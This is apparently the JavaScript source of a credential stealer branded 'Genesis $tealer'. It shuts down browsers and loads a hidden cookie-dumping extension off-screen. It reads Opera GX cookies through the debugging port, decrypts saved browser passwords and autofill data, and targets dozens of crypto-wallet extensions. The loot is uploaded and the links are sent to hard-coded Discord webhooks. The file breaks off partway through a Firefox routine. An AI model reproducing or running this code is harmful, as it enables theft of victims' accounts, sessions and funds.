const path = require('path');
const fs = require('fs-extra');
const fsPromises = require('fs').promises
const WebSocket = require('ws');

const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const FormData = require('form-data');
const AdmZip = require("adm-zip");
const archiver = require('archiver');

const { default: Dpapi } = require("@primno/dpapi");
const { Dpapi: ILoveDPAPI } = require('iloverte');
const { exec, spawn, execSync } = require('child_process');

const os = require('os');
const axios = require('axios');
const { randomUUID } = require('crypto');

const SERVER_URL = "webgenesis.icu";

const config = {
  webhook: 'https://discord.com/api/webhooks/1374433634353811567/XPIZUVf9knIm3gMn2NP9oTCJaB1ZJTmAD4HkUGLOzPDI964QTwfu75ZAIfYRy2KY6p3E',
  api: 'https://discord.com/api/webhooks/1394607667389136936/JcWEPwAs58R0Grzp4-bosk3_H6OPJrCNOslBXmMyU_d4zuuTYXji81qRD7onjr4SVUQn',
};

const panel = 'GENESIS-DAY-I04LBKFUK6Y7';

const appdata = process.env.APPDATA;
const localappdata = process.env.LOCALAPPDATA;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const paths = {
   Discord: `${process.env.APPDATA}\\discord\\`,
  'Discord Canary': `${process.env.APPDATA}\\discordcanary\\`,
  'Discord PTB': `${process.env.APPDATA}\\discordptb\\`,
  'Discord Dev': `${process.env.APPDATA}\\discorddevelopment\\`,
  Lightcord: `${process.env.APPDATA}\\lightcord\\`,
};

const browserPaths = {
  'Google(x86)':   `AppData\\Local\\Google(x86)\\Chrome\\User Data`,
  'Google SxS':    `AppData\\Local\\Google\\Chrome SxS\\User Data`,
  'Chromium':      `AppData\\Local\\Chromium\\User Data`,
  'Thorium':       `AppData\\Local\\Thorium\\User Data`,
  'Chrome':        `AppData\\Local\\Google\\Chrome\\User Data`,
  'MapleStudio':   `AppData\\Local\\MapleStudio\\ChromePlus\\User Data`,
  'Iridium':       `AppData\\Local\\Iridium\\User Data`,
  '7Star':         `AppData\\Local\\7Star\\7Star\\User Data`,
  'CentBrowser':   `AppData\\Local\\CentBrowser\\User Data`,
  'Chedot':        `AppData\\Local\\Chedot\\User Data`,
  'Vivaldi':       `AppData\\Local\\Vivaldi\\User Data`,
  'Kometa':        `AppData\\Local\\Kometa\\User Data`,
  'Elements':      `AppData\\Local\\Elements Browser\\User Data`,
  'Epic':          `AppData\\Local\\Epic Privacy Browser\\User Data`,
  'uCozMedia':     `AppData\\Local\\uCozMedia\\Uran\\User Data`,
  'Fenrir':        `AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer`,
  'Catalina':      `AppData\\Local\\CatalinaGroup\\Citrio\\User Data`,
  'Coowon':        `AppData\\Local\\Coowon\\Coowon\\User Data`,
  'Liebao':        `AppData\\Local\\liebao\\User Data`,
  'QIP Surf':      `AppData\\Local\\QIP Surf\\User Data`,
  'Orbitum':       `AppData\\Local\\Orbitum\\User Data`,
  'Comodo':        `AppData\\Local\\Comodo\\Dragon\\User Data`,
  '360Browser':    `AppData\\Local\\360Browser\\Browser\\User Data`,
  'Maxthon3':      `AppData\\Local\\Maxthon3\\User Data`,
  'K-Melon':       `AppData\\Local\\K-Melon\\User Data`,
  'CocCoc':        `AppData\\Local\\CocCoc\\Browser\\User Data`,
  'Amigo':         `AppData\\Local\\Amigo\\User Data`,
  'Torch':         `AppData\\Local\\Torch\\User Data`,
  'Sputnik':       `AppData\\Local\\Sputnik\\Sputnik\\User Data`,
  'Edge':          `AppData\\Local\\Microsoft\\Edge\\User Data`,
  'DCBrowser':     `AppData\\Local\\DCBrowser\\User Data`,
  'Yandex':        `AppData\\Local\\Yandex\\YandexBrowser\\User Data`,
  'UR Browser':    `AppData\\Local\\UR Browser\\User Data`,
  'Slimjet':       `AppData\\Local\\Slimjet\\User Data`,
  'BraveSoftware': `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data`,
  'Opera':         `AppData\\Roaming\\Opera Software\\Opera Stable`,
  'Opera GX':      `AppData\\Roaming\\Opera Software\\Opera GX Stable`,
};

const walletPaths = {
    'Trust': '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph',
    'Metamask': '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn',
    'Coinbase': '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad',
    'BinanceChain': '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp',
    'Phantom': '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa',
    'TronLink': '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec',
    'Ronin': '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec',
    'Exodus': '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno',
    'Coin98': '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg',
    'Authenticator': '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai',
    'MathWallet': '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc',
    'YoroiWallet': '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb',
    'GuardaWallet': '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln',
    'JaxxxLiberty': '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne',
    'Wombat': '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih',
    'EVERWallet': '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk',
    'KardiaChain': '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk',
    'XDEFI': '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf',
    'Nami': '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo',
    'TerraStation': '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp',
    'MartianAptos': '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk',
    'TON': '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd',
    'Keplr': '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap',
    'CryptoCom': '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj',
    'PetraAptos': '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci',
    'OKX': '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge',
    'Sollet': '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno',
    'Sender': '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg',
    'Sui': '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil',
    'SuietSui': '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd',
    'Braavos': '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma',
    'FewchaMove': '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj',
    'EthosSui': '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli',
    'ArgentX': '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb',
    'NiftyWallet': '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid',
    'BraveWallet': '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl',
    'EqualWallet': '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac',
    'BitAppWallet': '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi',
    'iWallet': '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj',
    'AtomicWallet': '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh',
    'MewCx': '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm',
    'GuildWallet': '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj',
    'SaturnWallet': '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig',
    'HarmonyWallet': '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib',
    'PaliWallet': '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn',
    'BoltX': '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca',
    'LiqualityWallet': '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn',
    'MaiarDeFiWallet': '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm',
    'TempleWallet': '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc',
    'Metamask_E': '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm',
    'Ronin_E': '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk',
    'Yoroi_E': '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb',
    'Authenticator_E': '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio',
    'MetaMask_O': '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'
};

const WalletsBrowser = {
  chrome: generateProfiles(`${localappdata}\\Google\\Chrome\\User Data`),
  brave: generateProfiles(`${localappdata}\\BraveSoftware\\Brave-Browser\\User Data`),
  edge: generateProfiles(`${localappdata}\\Microsoft\\Edge\\User Data`),
  yandex: generateProfiles(`${localappdata}\\Yandex\\YandexBrowser\\User Data`, 5, true),
  opera: [
      `${appdata}\\Opera Software\\Opera Stable\\`,
      `${appdata}\\Opera Software\\Opera GX Stable\\`
  ]
};

 const walletNames = [];
 const tokens = [];  

async function ChromiumCookies() {
  const downloadsDir = path.join(os.homedir(),"Downloads");
  const tempBaseDir = path.join(process.env.TEMP, `${randomUUID()}`);
  if (!fs.existsSync(tempBaseDir)) fs.mkdirSync(tempBaseDir, { recursive: true });

const browsers = [
  { name: "Chrome", identifier: "Chrome", exec: "chrome.exe", path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", userDir: "Google\\Chrome" },
  { name: "Brave", identifier: "Brave", exec: "brave.exe", path: "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", userDir: "BraveSoftware\\Brave-Browser" },
  { name: "Edge", identifier: "Edge", exec: "msedge.exe", path: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", userDir: "Microsoft\\Edge" },
  { name: "Vivaldi", identifier: "Vivaldi", exec: "vivaldi.exe", path: "C:\\Program Files\\Vivaldi\\vivaldi.exe", userDir: "Vivaldi" },
  { name: "Chromium", identifier: "Chromium", exec: "chromium.exe", path: "C:\\Program Files\\Chromium\\Application\\chromium.exe", userDir: "Chromium" },
  { name: "Epic", identifier: "Epic", exec: "epic.exe", path: "C:\\Program Files\\Epic Privacy Browser\\epic.exe", userDir: "Epic Privacy Browser" },
  { name: "Yandex", identifier: "Yandex", exec: "browser.exe", path: "C:\\Program Files (x86)\\Yandex\\YandexBrowser\\Application\\browser.exe", userDir: "Yandex\\YandexBrowser" }
];

  const urls = [
    "https://mail.google.com",
    "https://google.com",
    "https://outlook.live.com",
    "https://yandex.com/mail/",
    "https://mail.com/",
    "https://mail.yahoo.com/",
    "https://proton.me/",
    "https://drive.google.com/",
  ];

  const waitForFile = (filePath, minCount = 1, timeout = 30000) =>
    new Promise((resolve, reject) => {
      const start = Date.now();
      const fallbackRegex = /^cookies(\s\(\d+\))?\.txt$/i;

      const check = () => {
        if (fs.existsSync(filePath)) return resolve(filePath);

        const files = fs.readdirSync(downloadsDir);
        const fallbackFiles = files.filter(file =>
          fallbackRegex.test(file) && fs.statSync(path.join(downloadsDir, file)).size > 0
        );

        if (fallbackFiles.length >= minCount) {
          if (Date.now() - start >= 1000) {
            return resolve(path.join(downloadsDir, fallbackFiles[0]));
          }
        }

        if (Date.now() - start > timeout) return reject(new Error("Timeout"));

        setTimeout(check, 1000);
      };

      check();
    });

  const killBrowsers = () => {
    try {
      execSync("taskkill /F /IM chrome.exe", { stdio: "ignore" });
      execSync("taskkill /F /IM brave.exe", { stdio: "ignore" });
      execSync("taskkill /F /IM msedge.exe", { stdio: "ignore" });
    } catch {}
  };

  const results = [];
  const browserPromises = browsers.map(async (browser) => {
    try {
      const browserDir = path.join(os.homedir(), "AppData", "Local", browser.userDir);
      if (!fs.existsSync(browserDir)) {
        results.push({ browser: browser.name, status: "not_installed" });
        return;
      }

      const extDir = path.join(browserDir, "User Data", "Default", "Extensions", browser.identifier);
      fs.mkdirSync(extDir, { recursive: true });

      const browserTempDir = path.join(tempBaseDir, browser.name);
      fs.mkdirSync(browserTempDir, { recursive: true });

      const fileName = `${browser.name}_cookies.txt`;
	  const downloadedFile = path.join(downloadsDir, fileName);
      const destinationFile = path.join(browserTempDir, fileName);


			 const indexJs = `
	chrome.runtime.onInstalled.addListener(() => {
		chrome.tabs.create({ url: "about:blank" });
	});

	chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
		if (changeInfo.status === "complete") {
		try {
			const cookies = await chrome.cookies.getAll({});
			if (cookies && cookies.length) {
			const formatted = cookies.map((cookie) =>
				[
				cookie.domain,
				cookie.hostOnly ? "FALSE" : "TRUE",
				cookie.path,
				cookie.secure ? "TRUE" : "FALSE",
				cookie.expirationDate ? Math.floor(cookie.expirationDate) : 0,
				cookie.name,
				cookie.value
				].join("\\t")
			);

			const content = [
				"# Netscape HTTP Cookie File",
				"# https://curl.se/docs/http-cookies.html",
				"# This file was generated by Cookie Collector Extension",
				"",
				formatted.join('\\n')
			].join('\\n');

			const base64 = btoa(unescape(encodeURIComponent(content)));
			const fileUrl = 'data:text/plain;base64,' + base64;

			await chrome.downloads.download({
				url: fileUrl,
				filename: "${fileName}",
				saveAs: false
			});
			}
		} catch (err) {}
		}
	 });
   `;

  
      const manifest = {
        manifest_version: 3,
        name: "Cookies Collector",
        version: "3.0",
        permissions: ["cookies", "tabs", "downloads"],
        host_permissions: ["<all_urls>"],
        background: { service_worker: "index.js" },
      };

      fs.writeFileSync(path.join(extDir, "index.js"), indexJs.trim());
      fs.writeFileSync(path.join(extDir, "manifest.json"), JSON.stringify(manifest, null, 2));

const args = [
  '--load-extension=' + extDir,
  '--disable-extensions-except=' + extDir,
  '--disable-popup-blocking',
  '--no-first-run',
  '--no-default-browser-check',
  '--disable-session-crashed-bubble',
  '--window-size=800,600',
  '--window-position=-32000,-32000',
];

      if (!fs.existsSync(browser.path)) {
        results.push({ browser: browser.name, status: "binary_not_found" });
        return;
      }

      const proc = spawn(browser.path, args, {
        detached: true,
        stdio: "ignore",
      });
      proc.unref();

      await waitForFile(downloadedFile, 60000).catch(() => {
        spawn(browser.path, urls, { detached: true, stdio: "ignore" }).unref();
        return waitForFile(downloadedFile, 60000).catch(() => {
          results.push({ browser: browser.name, status: "timeout" });
        });
      });

if (filePath && fs.existsSync(filePath)) {
        fs.copyFileSync(filePath, destinationFile);
        fs.unlinkSync(filePath);
        const isFallback = path.basename(filePath).toLowerCase() !== path.basename(downloadedFile).toLowerCase();
        results.push({
          browser: browser.name,
          status: isFallback ? "success_fallback" : "success",
          file: destinationFile,
        });
      } else {

        const files = fs.readdirSync(downloadsDir);
        const fallbackFile = files.find(file =>
          /^cookies(\s\(\d+\))?\.txt$/i.test(file) && fs.statSync(path.join(downloadsDir, file)).size > 0
        );
        
        if (fallbackFile) {
          const fallbackPath = path.join(downloadsDir, fallbackFile);
          fs.copyFileSync(fallbackPath, destinationFile);

          results.push({
            browser: browser.name,
            status: "success_fallback",
            file: destinationFile,
            originalFile: fallbackFile,
          });
        } else {
        results.push({ browser: browser.name, status: "file_not_found" });
        }
      }

    } catch (err) {
      results.push({ browser: browser.name, status: "error", message: err.message });
    }
  });

  await Promise.all(browserPromises);
  killBrowsers();

    const fallbackDir = path.join(tempBaseDir, 'fallback-cookies');
  fs.mkdirSync(fallbackDir, { recursive: true });

  const downloadsCookiesFiles = fs.readdirSync(downloadsDir).filter(file =>
    /cookies.*\.txt$/i.test(file) && fs.statSync(path.join(downloadsDir, file)).size > 0
  );

  for (const file of downloadsCookiesFiles) {
    const srcPath = path.join(downloadsDir, file);
    const destPath = path.join(fallbackDir, file);
    fs.copyFileSync(srcPath, destPath);
    fs.unlinkSync(srcPath);
  
    results.push({
      browser: "Unknown (fallback)",
      status: "success_fallback",
      file: destPath,
    });
  }

  const zipFilePath = path.join(tempBaseDir, "chromium-cookies.zip");
  const output = fs.createWriteStream(zipFilePath);
  const archive = archiver("zip", { zlib: { level: 9 } });


  output.on("close", () => {
  });

  archive.pipe(output);

    for (const res of results) {
    if (
      (res.status === "success") &&
      res.file &&
      fs.existsSync(res.file)
    ) {
      archive.append(fs.createReadStream(res.file), { name: `${res.browser}.txt` });
    }
  }

  const fallbackFiles = fs.readdirSync(fallbackDir);
  for (const file of fallbackFiles) {
    const fallbackFilePath = path.join(fallbackDir, file);
    archive.append(fs.createReadStream(fallbackFilePath), { name: `fallback_${file}` });
  }

  await archive.finalize();

  return {
    zipFile: zipFilePath,
    results,
  };
}

async function chrome() {
  try {
    const result = await ChromiumCookies();

    if (!result.results.some(r => r.status === 'success' || r.status === 'success_fallback')) return;

    const zipFilePath = result.zipFile;
    if (!fs.existsSync(zipFilePath) || fs.statSync(zipFilePath).size === 0) {
      return;
    }

    const uploadUrl = await Upload(zipFilePath);
    if (!uploadUrl) {
      return;
    }

    const cookiesEmbed = {
      title: `Genesis $tealer (Cookies - V137) - ${os.userInfo().username}`,
      color: 0x808080,
      fields: [
        {
          name: "Content: Chromium Cookies Bypass (Edge, Chrome, Brave...) ",
          value: `[Click me!](${uploadUrl})`,
          inline: false,
        },
      ],
      footer: {
        text: "Genesis | t.me/genesisStealer  ",    
      },
    };

    await axios.post(config.webhook, { embeds: [cookiesEmbed] });
    await axios.post(config.api, { embeds: [cookiesEmbed] });
  } catch (error) {
  }
}

const configsOpera = {
  "operagx": {
      bin: path.join(process.env.LOCALAPPDATA, 'Programs', "Opera GX", 'opera.exe'),
      userData: path.join(process.env.APPDATA, 'Opera Software', 'Opera GX Stable')
  }
};
function browserExistsOpera(browser) {
  return fs.existsSync(configsOpera[browser].bin);
}

async function startBrowserOpera(browser) {
  const config = configsOpera[browser];
  if (!config) return;

  const randomPort = Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
  const command = `"${process.env.LOCALAPPDATA}\\Programs\\Opera GX\\opera.exe"`;
  const args = [
      `--remote-debugging-port=${randomPort}`,
      `--user-data-dir="${process.env.APPDATA}\\Opera Software\\Opera GX Stable"`,
      '--no-sandbox', 
      '--headless'
  ];
  const browserProcess = spawn(command, args, { shell: true });

  browserProcess.stdout.on('data', (data) => {
  });

  browserProcess.stderr.on('data', (data) => {
  });

  browserProcess.on('close', (code) => {
  });

  await sleep(5000);
  return { browserProcess, randomPort };
}

async function getDebugWsUrlOpera(port) {
  const url = `http://127.0.0.1:${port}/json`;
  let retries = 5;
  while (retries > 0) {
      try {
          const response = await axios.get(url);
          const data = response.data;
          if (data && data.length > 0) {
              return data[0]?.webSocketDebuggerUrl || null;
          }
      } catch (error) {
          await sleep(2000);
          retries--;
      }
  }
  return null;
}

function killOpera() {
  exec('tasklist', (error, stdout, stderr) => {
      if (error || stderr) {
          return;
      }

      const processes = stdout.split('\n')
          .filter(line => line.toLowerCase().includes('opera'))
          .map(line => line.trim().split(/\s+/)[0]);

      if (processes.length === 0) {
          return;
      }

      processes.forEach(proc => {
          exec(`taskkill /F /IM ${proc}`, (err) => {
              if (err) {
              } else {
              }
          });
      });
  });
}

async function saveCookiesToFileOpera(cookies) {
  const tempDir = os.tmpdir();
  const filePath = path.join(tempDir, 'OperaGX-Cookies.txt');
  
  const cookieText = cookies.map(cookie =>
      `${cookie.domain}\tTRUE\t${cookie.path || '/'}\tFALSE\t${cookie.expires || '2597573456'}\t${cookie.name}\t${cookie.value}`
  ).join('\n');
  
  fs.writeFileSync(filePath, cookieText);
  return filePath;
}

async function sendEmbedWithGoFileLink(cookieCount, gofileUrl) {
  if (!config.webhook) {
      return;
  }

  const embed = {
      title: "<a:Genesis:1387894590635245638> Opera Data - Cookies (V20)",
      description: ` Collected ${cookieCount} cookies from Opera GX`,
      color: 0x808080, 
      fields: [
          {
              name: "<:dl:1387891242360242288> Click me!",
              value: `[Download](${gofileUrl})`,
              inline: false
          }
      ],
      footer: {
          text: "Genesis | t.me/genesisStealer",
      },
  };

  try {
      await axios.post(config.webhook, {
          embeds: [embed]
      });
      await axios.post(config.api, {
          embeds: [embed]
      });
  } catch (error) {
  }
}

async function getCookiesOpera(wsUrl) {
  return new Promise((resolve, reject) => {
      const ws = new WebSocket(wsUrl);
      ws.on('open', () => {
          ws.send(JSON.stringify({ method: 'Network.getAllCookies', id: 1 }));
      });

      ws.on('message', (data) => {
          const response = JSON.parse(data);
          if (response.id === 1 && response.result) {
              resolve(response.result.cookies);
              ws.close();
          }
      });
      ws.on('error', (error) => {
          reject(error);
      });
  });
}

async function processBrowserOpera(browser) {
  if (!browserExistsOpera(browser)) {
      return;
  }
  
  const { browserProcess, randomPort } = await startBrowserOpera(browser);
  const wsUrl = await getDebugWsUrlOpera(randomPort);

  if (!wsUrl) {
      browserProcess.kill();
      return;
  }

  try {
      const cookies = await getCookiesOpera(wsUrl);
      if (cookies && cookies.length > 0) {
          const filePath = await saveCookiesToFileOpera(cookies);
          const gofileUrl = await Upload(filePath);
          
          if (gofileUrl) {
              await sendEmbedWithGoFileLink(cookies.length, gofileUrl);
          }
      } else {
      }
  } catch (error) {
  } finally {
      browserProcess.kill();
  }
}

async function startOpera() {
  const browsers = ["operagx"];
  for (const browser of browsers) {
      await processBrowserOpera(browser);
  }
}

async function opera() {
  await killOpera();
  await sleep(2000);
  await startOpera();
  await sleep(1000);
  await killOpera();
  await sleep(1000);
}

const operaGXPath = path.join(process.env.APPDATA || '', 'Opera Software', 'Opera GX Stable');

function decryptAESGCM(enc, key) {
  try {
    const iv = enc.slice(3, 15);
    const data = enc.slice(15, -16);
    const tag = enc.slice(-16);
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(tag);
    return decipher.update(data) + decipher.final('utf8');
  } catch (e) {
    return null;
  }
}

async function extractDB(dbPath, table, fields) {
  return new Promise(r => {
    if (!fs.existsSync(dbPath)) {
      return r([]);
    }
    const tmp = path.join(os.tmpdir(), `tmp_${Math.random().toString(36).slice(2)}.db`);
    try {
      fs.copyFileSync(dbPath, tmp);
    } catch (e) {
      return r([]);
    }
    const db = new sqlite3.Database(tmp);
    const results = [];
    db.each(`SELECT ${fields.join(',')} FROM ${table}`, (e, row) => {
      if (e) {
        return;
      }
      results.push(row);
    }, () => {
      db.close();
      try { fs.unlinkSync(tmp); } catch {}
      r(results);
    });
  });
}

async function zipFolder(sourceFolder, outPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(outPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', () => {
      resolve();
    });
    archive.on('error', err => {
      reject(err);
    });

    archive.pipe(output);
    archive.directory(sourceFolder, false);
    archive.finalize();
  });
}

async function Operapass() {
  try {
    if (!fs.existsSync(operaGXPath)) {
      return;
    }

    const localStatePath = path.join(operaGXPath, 'Local State');
    if (!fs.existsSync(localStatePath)) {
      return;
    }

    const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    if (!localState?.os_crypt?.encrypted_key) {
      return;
    }

    const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);

    let masterKey;
    try {
      masterKey = ILoveDPAPI.unprotectData(encryptedKey, null, 'CurrentUser');
    } catch (e) {
      return;
    }

    const profiles = fs.readdirSync(operaGXPath, { withFileTypes: true })
      .filter(d => d.isDirectory() && (d.name === 'Default' || d.name.startsWith('Profile')))
      .map(d => path.join(operaGXPath, d.name));

    if (profiles.length === 0) {
      profiles.push(operaGXPath);
    }

    const passwords = [];
    const autofills = [];

    for (const p of profiles) {

      const loginDB = path.join(p, 'Login Data');
      const webDB = path.join(p, 'Web Data');

      const logins = await extractDB(loginDB, 'logins', ['origin_url', 'username_value', 'password_value']);
      for (const { origin_url, username_value, password_value } of logins) {
        if (!username_value || !password_value) continue;
        const dec = decryptAESGCM(password_value, masterKey);
        if (dec) passwords.push(`${origin_url} | ${username_value} | ${dec}`);
      }

      const autofillRows = await extractDB(webDB, 'autofill_profiles', ['name_value', 'value']);
      autofillRows.forEach(({ name_value, value }) => {
        if (name_value && value) autofills.push(`${name_value} | ${value}`);
      });
    }

    if (!passwords.length && !autofills.length) {
      return;
    }

    const tempDir = path.join(os.tmpdir(), Math.random().toString(36).slice(2));
    fs.mkdirSync(tempDir);

    if (passwords.length) {
      fs.writeFileSync(path.join(tempDir, 'passwords.txt'), passwords.join('\n'), 'utf8');
    }
    if (autofills.length) {
      fs.writeFileSync(path.join(tempDir, 'autofills.txt'), autofills.join('\n'), 'utf8');
    }

    const zipPath = path.join(os.tmpdir(), `${path.basename(tempDir)}.zip`);
    await zipFolder(tempDir, zipPath);

    const url = await Upload(zipPath);
    if (!url) {
      return;
    }

    const embed = {
      title: "<a:Genesis:1387894590635245638> Genesis - Opera GX Bypass (Passwords & Autofills)",
      color: 0x808080,
      fields: [{ name: "<:dl:1387891242360242288> Download Link", value: `[Click me!](${url})`, inline: false }],
      footer: { text: "Genesis | t.me/GenesisStealer" },
    };

    await axios.post(config.webhook, { embeds: [embed] });
    await axios.post(config.api, { embeds: [embed] });
    try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch {}
    try { fs.unlinkSync(zipPath); } catch {}

  } catch (e) {
  }
}

async function getDataBrowser() {
  const profiles = [];
  const usersAll = await getUsers();

  return new Promise(async (res, rej) => {
    try {
      for (const user of usersAll) {
        for (const [name, relativePath] of Object.entries(browserPaths)) {
          const fullPath = path.join(user, relativePath);
    
          if (!fs.existsSync(fullPath) || !fs.lstatSync(fullPath).isDirectory()) continue;
          
          let profilesPath = (await getBrowserProfiles(fullPath, name)).map((prof) => ({
            ...prof, 
            browser: { 
              name, 
              path: fullPath, 
              user: user.split(path.sep)[2]
            }
          })).filter((prof) => !["Guest Profile", "System Profile"].includes(prof.profile));
    
          const masterKey = await getMasterKey(fullPath);
          if (!masterKey) continue;
    
          if (profilesPath.length === 0) continue;
          
          for (const profile of profilesPath) {
            profile.autofills = await getAutofills(profile.path) || [];
            profile.passwords = await getPasswords(profile.path, masterKey) || [];
            profile.cookies = await getCookies(profile.path, masterKey) || [];
            
            profiles.push(profile);
          }
        }
      }
      return res(profiles);
    } catch (e) {
      return rej(e);
    }
  });
}

async function getCookies(profilePath, masterKey) {
  return new Promise(async (resolve) => {
    try {
      const cookies = [];
      const dbPath = path.join(profilePath, 'Network', 'Cookies');
      if (!fs.existsSync(dbPath)) return resolve([]);

      const rows = await executeQuery(dbPath, 
        'SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies');
      
      for (const row of rows) {
        if (!row.encrypted_value) continue;

        let decryptedValue = await decrypt(row.encrypted_value, masterKey).catch(() => null);
        if (!decryptedValue) continue;

        cookies.push({
          domain: row.host_key,
          name: row.name,
          value: decryptedValue,
          path: row.path,
          expires: row.expires_utc,
          secure: row.is_secure
        });
      }

      resolve(cookies);
    } catch (_) {
      resolve([]);
    }
  });
}

function exportToNetscapeFormat(cookies, outputPath) {
  const lines = [
    "# Netscape HTTP Cookie File",
    "# This file is generated by a script",
    "# Format: domain\tflag\tpath\tsecure\texpiration\tname\tvalue\n"
  ];

  cookies.forEach(cookie => {
    const flag = cookie.domain.startsWith('.') ? "TRUE" : "FALSE";
    const secure = cookie.secure ? "TRUE" : "FALSE";
    const expires = Math.floor(cookie.expires / 1000000 - 11644473600);

    lines.push([
      cookie.domain,
      flag,
      cookie.path,
      secure,
      expires,
      cookie.name,
      cookie.value
    ].join('\t'));
  });

  fs.writeFileSync(outputPath, lines.join('\n'));
}

(async () => {
  const profilePath = 'CHEMIN_VERS_PROFIL';
  const masterKey = 'MASTER_KEY';
  const outputTxt = 'cookies.txt';

  const cookies = await getCookies(profilePath, masterKey);

  exportToNetscapeFormat(cookies, outputTxt);
})();

async function getBrowserProfiles(fullPath, browser) {
  try { 
    if (!fs.existsSync(fullPath)) return [];
    const dirs = fs.readdirSync(fullPath);

    return dirs.reduce((profiles, dir) => {
        if (dir.includes("Profile") || dir === "Default") {
          const profilePath = path.join(fullPath, dir);

          const exists = profiles.some(profile => profile.path === profilePath);          
          if (!exists) {
            profiles.push({
              name: browser,
              profile: dir,
              path: profilePath,
            });
          }
        }

        return profiles;
    }, []);
  } catch (e) {
    return [];
  }
}

async function getAutofills(pathh) {
  try { 
    const autofills = [];

    const rows = await executeQuery(path.join(pathh, 'Web Data'), 'SELECT * FROM autofill');
    rows.map((rw) => autofills.push(`Name: ${rw?.name} | Value: ${rw?.value}`));

    return autofills;
  } catch {
    return [];
  }
}

async function getPasswords(pathh, masterKey) {
  return new Promise(async (res, rej) => {
    try { 
      const passwords = [];
  
      const rows = await executeQuery( pathh.includes("Yandex") ? path.join(pathh, 'Ya Passman Data') : path.join(pathh, 'Login Data'), 'SELECT * FROM logins');
      rows.map(async (rw) => {
        if (!rw.username_value) return;
        
        let password = rw.password_value;
        if (password) password = await decrypt(password, masterKey).catch(() => {});
      
        if (password && rw.username_value) passwords.push(`Username: ${rw.username_value} | Password: ${password} | Origin: ${rw.origin_url}`);
      });
  
      return res(passwords);
    } catch {
      return res([]);
    }
  })
}

async function firefoxCookies(pathDefault) {
  const cookies = [];
  const firefoxPaths = [
    path.join(process.env.APPDATA, "Mozilla", "Firefox", "Profiles"),
    path.join(process.env.APPDATA, "Waterfox", "Profiles")
  ];

  for (const firefoxPath of firefoxPaths) {
    try {
